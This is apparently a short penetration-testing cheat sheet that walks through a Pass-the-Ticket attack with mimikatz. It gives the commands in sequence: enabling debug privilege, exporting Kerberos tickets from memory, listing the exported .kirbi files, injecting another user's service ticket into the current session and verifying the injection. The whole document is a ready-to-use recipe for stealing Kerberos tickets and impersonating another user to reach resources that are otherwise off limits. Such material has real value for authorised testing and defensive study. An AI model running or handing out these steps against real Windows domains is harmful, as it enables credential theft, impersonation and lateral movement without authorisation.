mimikatz

Pass-the-Ticket extracts existing Kerberos tickets from memory and re-injects a chosen ticket into the current session. By injecting another user's TGS, the operator impersonates that user and accesses resources the current context cannot reach. Injecting a TGT instead allows requesting new service tickets across systems. No admin rights are required when reusing the current user's own tickets; extracting other users' tickets requires local admin.

Confirm Lack Of Access

ls \\web04\backup

Enable Debug Privilege

privilege::debug

Export Tickets From Memory

Export all TGT/TGS tickets to disk in .kirbi format. Files are saved to the current directory.

sekurlsa::tickets /export

List Exported Tickets

dir *.kirbi

Inject The Ticket (Pass The Ticket)

kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi

Verify Injection

klist
